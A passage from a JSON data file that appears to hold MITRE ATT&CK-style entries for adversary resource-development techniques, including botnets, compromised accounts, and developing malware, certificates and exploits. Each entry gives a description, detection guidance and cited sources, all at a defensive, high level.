Content","Internet Scan: Response Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1584.005","name":"Botnet","description":"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. <a href=\"https://us.norton.com/internetsecurity-malware-what-is-a-botnet.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Norton Botnet)</a> Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems. <a href=\"https://www.imperva.com/learn/ddos/booters-stressers-ddosers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Imperva DDoS for Hire)</a> Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers. <a href=\"https://www.secureworks.com/research/dridex-bugat-v5-botnet-takeover-operation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dell Dridex Oct 2015)</a> With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale Phishing or Distributed Denial of Service (DDoS).","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Phishing, Endpoint Denial of Service, or Network Denial of Service.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1584.006","name":"Web Services","description":"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, SendGrid, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. <a href=\"https://www.recordedfuture.com/research/turla-apt-infrastructure\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Recorded Future Turla Infra 2020)</a> Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them. Additionally, leveraging compromised web-based email services may allow adversaries to leverage the trust associated with legitimate domains.","detection":"Once adversaries leverage the abused web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known. <a href=\"https://threatconnect.com/blog/infrastructure-research-hunting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ThreatConnect Infrastructure Dec 2020)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control (Web Service) or Exfiltration Over Web Service.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1584.007","name":"Serverless","description":"Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. \n\nOnce compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server. <a href=\"https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackWater Malware Cloudflare Workers)</a> <a href=\"https://blog.xpnsec.com/aws-lambda-redirector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Lambda Redirector)</a> <a href=\"https://www.bleepingcomputer.com/news/security/hackers-abuse-google-apps-script-to-steal-credit-cards-bypass-csp/#google_vignette\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GWS Apps Script Abuse 2021)</a> As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to Hide Infrastructure. (Citation: Detecting Command &amp; Control in the Cloud) <a href=\"https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackWater Malware Cloudflare Workers)</a>","detection":"","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1584.008","name":"Network Devices","description":"Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not Initial Access to that environment, but rather to leverage these devices to support additional targeting.\n\nOnce an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for Phishing campaigns (i.e., Link Target) or enabling the required access to execute Content Injection operations. Adversaries may also be able to harvest reusable credentials (i.e., Valid Accounts) from compromised network devices.\n\nAdversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses. <a href=\"https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Fortinet Zero Day)</a> <a href=\"https://www.wired.com/story/russia-ukraine-cyberattacks-mandiant/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wired Russia Cyberwar)</a>\n\nCompromised network devices may be used to support subsequent Command and Control activity, such as Hide Infrastructure through an established Proxy and/or Botnet network. <a href=\"https://www.justice.gov/opa/pr/justice-department-conducts-court-authorized-disruption-botnet-controlled-russian\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Justice GRU 2024)</a>","detection":"","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]}]},{"id":"T1585","name":"Establish Accounts","description":"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity. <a href=\"https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NEWSCASTER2014)</a> <a href=\"http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHatRobinSage)</a>\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. <a href=\"https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NEWSCASTER2014)</a> <a href=\"http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHatRobinSage)</a>\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for Phishing for Information or Phishing. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a> In addition, establishing accounts may allow adversaries to abuse free services, such as registering for trial periods to Acquire Infrastructure for malicious purposes. <a href=\"https://unit42.paloaltonetworks.com/purpleurchin-steals-cloud-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Trial PurpleUrchin)</a>","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content","Persona: Social Media"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[{"id":"T1585.001","name":"Social Media Accounts","description":"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. <a href=\"https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NEWSCASTER2014)</a> <a href=\"http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHatRobinSage)</a>\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others. <a href=\"https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NEWSCASTER2014)</a> <a href=\"http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHatRobinSage)</a> These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).","platforms":["PRE"],"dataSources":["Network Traffic: Network Traffic Content","Persona: Social Media"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1585.002","name":"Email Accounts","description":"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct Phishing for Information or Phishing. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a> Establishing email accounts may also allow adversaries to abuse free services – such as trial periods – to Acquire Infrastructure for follow-on purposes. <a href=\"https://unit42.paloaltonetworks.com/purpleurchin-steals-cloud-resources/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Free Trial PurpleUrchin)</a>\n\nAdversaries may also take steps to cultivate a persona around the email account, such as through use of Social Media Accounts, to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: Domains). <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a>\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/r980-ransomware-disposable-email-service/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro R980 2016)</a>","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1585.003","name":"Cloud Accounts","description":"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers. <a href=\"https://awakesecurity.com/blog/threat-hunting-series-detecting-command-control-in-the-cloud/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Awake Security C2 Cloud)</a>\n\nCreating Cloud Accounts may also require adversaries to establish Email Accounts to register with the cloud provider.","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: Transfer Data to Cloud Account).","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]}]},{"id":"T1586","name":"Compromise Accounts","description":"Adversaries may compromise accounts with services that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating accounts (i.e. Establish Accounts), adversaries may compromise existing accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. <a href=\"https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AnonHBGary)</a> <a href=\"https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DEV-0537)</a> Prior to compromising accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries may directly leverage compromised email accounts for Phishing for Information or Phishing.","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).","platforms":["PRE"],"dataSources":["Persona: Social Media","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[{"id":"T1586.001","name":"Social Media Accounts","description":"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. Social Media Accounts), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps). <a href=\"https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AnonHBGary)</a> Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others. <a href=\"https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NEWSCASTER2014)</a> <a href=\"http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHatRobinSage)</a> Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Spearphishing via Service).","platforms":["PRE"],"dataSources":["Persona: Social Media","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1586.002","name":"Email Accounts","description":"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct Phishing for Information, Phishing, or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: Domains).\n\nA variety of methods exist for compromising email accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. <a href=\"https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AnonHBGary)</a> <a href=\"https://www.microsoft.com/security/blog/2022/03/22/dev-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DEV-0537)</a> Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or Phishing emails may evade reputation-based email filtering rules.\n\nAdversaries can use a compromised email account to hijack existing email threads with targets of interest.","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: Phishing).","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1586.003","name":"Cloud Accounts","description":"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for Exfiltration to Cloud Storage or to Upload Tools. Cloud accounts can also be used in the acquisition of infrastructure, such as Virtual Private Servers or Serverless infrastructure. Additionally, cloud-based messaging services such as Twilio, SendGrid, AWS End User Messaging, AWS SNS (Simple Notification Service), or AWS SES (Simple Email Service) may be leveraged for spam or Phishing. <a href=\"https://unit42.paloaltonetworks.com/compromised-cloud-compute-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)</a> <a href=\"https://www.netcraft.com/blog/popular-email-platform-used-to-impersonate-itself/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netcraft SendGrid 2024)</a> Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers. <a href=\"https://awakesecurity.com/blog/threat-hunting-series-detecting-command-control-in-the-cloud/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Awake Security C2 Cloud)</a>\n\nA variety of methods exist for compromising cloud accounts, such as gathering credentials via Phishing for Information, purchasing credentials from third-party sites, conducting Password Spraying attacks, or attempting to Steal Application Access Tokens. <a href=\"https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSTIC Nobelium Oct 2021)</a> Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a Trusted Relationship between service providers and their customers. <a href=\"https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSTIC Nobelium Oct 2021)</a>","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: Transfer Data to Cloud Account).","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]}]},{"id":"T1587","name":"Develop Capabilities","description":"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a> <a href=\"https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Sofacy)</a> <a href=\"https://www.bitdefender.com/files/News/CaseStudies/study/353/Bitdefender-Whitepaper-StrongPity-APT.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bitdefender StrongPity June 2020)</a> <a href=\"https://blog.talosintelligence.com/2020/06/promethium-extends-with-strongpity3.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Promethium June 2020)</a>\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.","detection":"Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.\n\nConsider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure. <a href=\"https://www.splunk.com/en_us/blog/security/tall-tales-of-hunting-with-tls-ssl-certificates.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk Kovar Certificates 2017)</a>\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.","platforms":["PRE"],"dataSources":["Malware Repository: Malware Content","Malware Repository: Malware Metadata","Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[{"id":"T1587.001","name":"Malware","description":"Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1)</a> <a href=\"https://securelist.com/sofacy-apt-hits-high-profile-targets-with-updated-toolset/72924/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Sofacy)</a> <a href=\"https://arstechnica.com/information-technology/2014/06/active-malware-operation-let-attackers-sabotage-us-energy-industry/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ActiveMalwareEnergy)</a> <a href=\"https://therecord.media/fbi-fin7-hackers-target-us-companies-with-badusb-devices-to-install-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI Flash FIN7 USB)</a>\n\nDuring malware development, adversaries may intentionally include indicators aligned with other known actors in order to mislead attribution by defenders. <a href=\"https://blog.talosintelligence.com/who-wasnt-responsible-for-olympic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Olympic Destroyer)</a> <a href=\"https://news.risky.biz/risky-bulletin-threat-actor-impersonates-fsb-apt-for-months-to-target-russian-orgs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Risky Bulletin Threat actor impersonates FSB APT)</a> <a href=\"https://medium.com/@knownsec404team/love-and-hate-under-war-the-gamacopy-organization-which-imitates-the-russian-gamaredon-uses-560ba5e633fa\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GamaCopy organization)</a>\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of Web Services. <a href=\"https://www2.fireeye.com/rs/848-DID-242/images/rpt-apt29-hammertoss.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT29)</a>","detection":"Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle.","platforms":["PRE"],"dataSources":["Malware Repository: Malware Content","Malware Repository: Malware Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1587.002","name":"Code Signing Certificates","description":"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. <a href=\"https://en.wikipedia.org/wiki/Code_signing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Code Signing)</a> Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.","detection":"Consider analyzing self-signed code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, and common name. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in crafting self-signed code signing certificates.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as Code Signing or Install Root Certificate.","platforms":["PRE"],"dataSources":["Malware Repository: Malware Metadata"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1587.003","name":"Digital Certificates","description":"Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if added to the root of trust (i.e. Install Root Certificate).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.","detection":"Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure. <a href=\"https://www.splunk.com/en_us/blog/security/tall-tales-of-hunting-with-tls-ssl-certificates.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Splunk Kovar Certificates 2017)</a>\n\nDetection efforts may be focused on related behaviors, such as Web Protocols, Asymmetric Cryptography, and/or Install Root Certificate.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1587.004","name":"Exploits","description":"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits. <a href=\"https://www.nytimes.com/2011/01/16/world/middleeast/16stuxnet.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NYTStuxnet)</a> Adversaries may use information acquired via Vulnerabilities to focus exploit development efforts. As part of 